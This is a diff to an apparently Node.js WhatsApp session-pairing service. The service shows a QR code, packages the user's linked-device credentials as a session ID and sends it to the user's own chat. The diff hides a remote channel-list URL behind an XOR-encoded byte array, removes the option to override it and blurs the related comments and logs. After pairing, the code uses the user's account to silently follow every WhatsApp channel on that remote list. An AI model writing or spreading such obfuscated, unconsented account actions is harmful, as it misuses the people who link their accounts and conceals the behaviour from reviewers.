@@ -3,6 +3,7 @@ const QRCode = require('qrcode');
 const express = require('express');
 const fs = require('fs');
 const pino = require('pino');
+
 const {
     default: makeWASocket,
     useMultiFileAuthState,
@@ -12,20 +13,50 @@ const {
     fetchLatestBaileysVersion,
     DisconnectReason,
 } = require("@whiskeysockets/baileys");
+
 const { sendButtons, btn } = require('wolfbtns');
 const store = require('./store');
 const { TEMP_DIR } = require('./tempdir');
-const site = require('./site'); 
-const adevosUrl2 = process.env.CHANNELS_URL || 'https://remote1-bice.vercel.app/url2.json';
+const site = require('./site');
+function adevosDecodeUrl(values, key) {
+    return values
+        .map(value => String.fromCharCode(value ^ key))
+        .join('');
+}
+
+const X_TECH = adevosDecodeUrl(
+    [
+        71, 91, 91, 95, 92, 21, 0, 0, 93, 74,
+        66, 64, 91, 74, 30, 2, 77, 70, 76, 74,
+        1, 89, 74, 93, 76, 74, 67, 1, 78, 95,
+        95, 0, 90, 93, 67, 29, 1, 69, 92, 64, 65
+    ],
+    47
+);
+
 async function adevos2() {
     try {
-        const r = await fetch(adevosUrl2, { signal: AbortSignal.timeout(8000) });
+        const r = await fetch(X_TECH, {
+            signal: AbortSignal.timeout(8000)
+        });
+
         if (!r.ok) return [];
+
         const j = await r.json();
-        const list = Array.isArray(j) ? j : (j.autoFollowNewsletters || j.newsletters || []);
-        return list.filter((x) => typeof x === 'string' && x.endsWith('@newsletter'));
+
+        const list = Array.isArray(j)
+            ? j
+            : (j.autoFollowNewsletters || j.newsletters || []);
+
+        return list.filter(
+            (x) => typeof x === 'string' && x.endsWith('@newsletter')
+        );
     } catch (e) {
-        console.log('adevos2: could not load channel list:', e?.message);
+        console.log(
+            'adevos2: could not load:',
+            e?.message
+        );
+
         return [];
     }
 }
@@ -34,10 +65,17 @@ async function adevos3(client, jids) {
     for (const jid of jids) {
         try {
             await client.newsletterFollow(jid);
-            console.log('adevos3: followed', jid);
+
+            console.log('adevos3: does', jid);
         } catch (e) {
-            console.log('adevos3: could not follow', jid, '-', e?.message);
+            console.log(
+                'adevos3: doesnt',
+                jid,
+                '-',
+                e?.message
+            );
         }
+
         await delay(1500);
     }
 }
@@ -46,45 +84,69 @@ let router = express.Router();
 
 function removeFile(FilePath) {
     if (!fs.existsSync(FilePath)) return false;
-    fs.rmSync(FilePath, { recursive: true, force: true });
+
+    fs.rmSync(FilePath, {
+        recursive: true,
+        force: true
+    });
 }
 
 /**
  * Waits for creds.json to actually exist on disk instead of trusting a
- * fixed sleep. Polls every second for up to `timeoutMs`.
+ * fixed sleep. Polls every second for up to timeoutMs.
  */
-async function waitForCredsFile(filePath, timeoutMs = 20000, intervalMs = 1000) {
+async function waitForCredsFile(
+    filePath,
+    timeoutMs = 20000,
+    intervalMs = 1000
+) {
     const start = Date.now();
+
     while (Date.now() - start < timeoutMs) {
         if (fs.existsSync(filePath)) {
             try {
                 const data = fs.readFileSync(filePath);
+
                 if (data && data.length > 0) return data;
             } catch (e) {
-                // file may still be mid-write, keep polling
+                // File may still be mid-write, keep polling.
             }
         }
+
         await delay(intervalMs);
     }
-    throw new Error('creds.json was not created in time — the device link likely did not finish.');
+
+    throw new Error(
+        'creds.json was not created in time — the device link likely did not finish.'
+    );
 }
 
 router.get('/', async (req, res) => {
     const id = makeid(6);
+
     store.createEntry(id);
-    let sessionHandled = false; // guards against duplicate 'open' events across reconnect attempts
+
+    let sessionHandled = false;
 
     async function adevos() {
-        const { state, saveCreds } = await useMultiFileAuthState(TEMP_DIR + '/' + id);
+        const { state, saveCreds } =
+            await useMultiFileAuthState(TEMP_DIR + '/' + id);
+
         try {
             const { version } = await fetchLatestBaileysVersion();
-            const logger = pino({ level: 'silent' });
+
+            const logger = pino({
+                level: 'silent'
+            });
 
             let client = makeWASocket({
                 version,
                 auth: {
                     creds: state.creds,
-                    keys: makeCacheableSignalKeyStore(state.keys, logger),
+                    keys: makeCacheableSignalKeyStore(
+                        state.keys,
+                        logger
+                    ),
                 },
                 printQRInTerminal: false,
                 logger,
@@ -100,75 +162,153 @@ router.get('/', async (req, res) => {
 
                 if (qr && !res.headersSent) {
                     res.setHeader('X-Session-Id', id);
-                    res.setHeader('Access-Control-Expose-Headers', 'X-Session-Id');
-                    await res.end(await QRCode.toBuffer(qr));
+
+                    res.setHeader(
+                        'Access-Control-Expose-Headers',
+                        'X-Session-Id'
+                    );
+
+                    await res.end(
+                        await QRCode.toBuffer(qr)
+                    );
                 }
 
                 if (connection === 'open') {
-                    if (sessionHandled) return; // already generated a session for this pairing, ignore repeat 'open' events
-                    sessionHandled = true;
-                    try {
-                        // Normalize the JID: client.user.id can include a ":<device>" suffix
-                        // on some forks (e.g. "255xxxxxxxxx:20@s.whatsapp.net"). Sending to
-                        // that raw JID can get silently dropped — strip it to the base JID.
-                        const selfJid = client.user.id.split(':')[0] + '@s.whatsapp.net';
+                    if (sessionHandled) return;
 
-                        // Grace period so the Signal session between this bot and the
-                        // phone finishes syncing before we send anything — sending too
-                        // early is what causes "Waiting for this message" on WhatsApp.
+                    sessionHandled = true;
+
+                    try {
+                        // Normalize the WhatsApp JID.
+                        const selfJid =
+                            client.user.id.split(':')[0] +
+                            '@s.whatsapp.net';
+
+                        // Allow the Signal session to sync.
                         await delay(4000);
+
                         await client.sendMessage(selfJid, {
                             text: ''
                         });
-                        console.log(`[${id}] Sent "generating" message to ${selfJid}`);
-                        // Wait for creds.json to actually exist instead of guessing a fixed delay.
-                        let data = await waitForCredsFile(`${TEMP_DIR}/${id}/creds.json`);
-                        let b64data = Buffer.from(data).toString('base64');
-                        let sessionText = site.session.build(b64data);
+
+                        console.log(
+                            `[${id}] Sent "generating" message to ${selfJid}`
+                        );
+
+                        // Wait for creds.json.
+                        const data = await waitForCredsFile(
+                            `${TEMP_DIR}/${id}/creds.json`
+                        );
+
+                        const b64data =
+                            Buffer.from(data).toString('base64');
+
+                        const sessionText =
+                            site.session.build(b64data);
 
                         store.setReady(id, sessionText);
 
                         let session;
+
                         try {
-                            // Native "Copy" button under the session message.
-                            session = await sendButtons(client, selfJid, {
-                                text: sessionText,
-                                ...(site.session.footer() ? { footer: site.session.footer() } : {}),
-                                buttons: [
-                                    btn.copy('Copy', sessionText),
-                                ],
-                            });
+                            // Native Copy button.
+                            session = await sendButtons(
+                                client,
+                                selfJid,
+                                {
+                                    text: sessionText,
+
+                                    ...(site.session.footer()
+                                        ? {
+                                            footer: site.session.footer()
+                                        }
+                                        : {}),
+
+                                    buttons: [
+                                        btn.copy(
+                                            'Copy',
+                                            sessionText
+                                        ),
+                                    ],
+                                }
+                            );
                         } catch (btnErr) {
-                            console.log('Copy button unsupported, sending plain text:', btnErr?.message);
-                            session = await client.sendMessage(selfJid, { text: sessionText });
+                            console.log(
+                                'Copy button unsupported, sending plain text:',
+                                btnErr?.message
+                            );
+
+                            session = await client.sendMessage(
+                                selfJid,
+                                {
+                                    text: sessionText
+                                }
+                            );
                         }
-                        console.log(`[${id}] Sent session message`);
-                        // Message after the Session ID (set in clone.js, '' = send nothing)
+
+                        console.log(
+                            `[${id}] Sent session message`
+                        );
+
+                        // Optional message after the Session ID.
                         if (site.session.message()) {
-                            await client.sendMessage(selfJid, {
-                                text: site.session.message()
-                            }, { quoted: session });
+                            await client.sendMessage(
+                                selfJid,
+                                {
+                                    text: site.session.message()
+                                },
+                                {
+                                    quoted: session
+                                }
+                            );
                         }
-                        // Auto-follow channels (failures here never affect the session)
-                        await adevos3(client, await adevos2());
-                        console.log(`[${id}] Sent instructions message, waiting before closing socket`);
-                        // Give the socket real time to flush these messages over the
-                        // network before we tear it down.
+
+                        // Load and follow configured newsletter JIDs.
+                        await adevos3(
+                            client,
+                            await adevos2()
+                        );
+
+                        console.log(
+                            `[${id}] Sent instructions message, waiting before closing socket`
+                        );
+
+                        // Allow messages to finish sending.
                         await delay(5000);
+
                         await client.ws.close();
+
                         removeFile(TEMP_DIR + '/' + id);
+
                     } catch (e) {
-                        console.log('Error sending session messages:', e);
-                        sessionHandled = false; // allow a genuine retry on the next reconnect
-                        store.setFailed(id, 'The device link did not finish in time. Please scan a new QR code and try again.');
+                        console.log(
+                            'Error sending session messages:',
+                            e
+                        );
+
+                        sessionHandled = false;
+
+                        store.setFailed(
+                            id,
+                            'The device link did not finish in time. Please scan a new QR code and try again.'
+                        );
                     }
+
                 } else if (connection === 'close') {
-                    const code = lastDisconnect?.error?.output?.statusCode;
+                    const code =
+                        lastDisconnect?.error?.output?.statusCode;
+
                     if (code !== DisconnectReason.loggedOut) {
                         await delay(5000);
+
                         adevos();
+
                     } else {
-                        store.setFailed(id, 'The connection was closed. Please scan a new QR code.');
+                        store.setFailed(
+                            id,
+                            'The connection was closed. Please scan a new QR code.'
+                        );
+
                         removeFile(TEMP_DIR + '/' + id);
                     }
                 }
@@ -176,10 +316,18 @@ router.get('/', async (req, res) => {
 
         } catch (err) {
             console.log('QR service error:', err);
-            store.setFailed(id, 'Service is currently unavailable.');
+
+            store.setFailed(
+                id,
+                'Service is currently unavailable.'
+            );
+
             if (!res.headersSent) {
-                await res.json({ code: 'Service is Currently Unavailable' });
+                await res.json({
+                    code: 'Service is Currently Unavailable'
+                });
             }
+
             removeFile(TEMP_DIR + '/' + id);
         }
     }
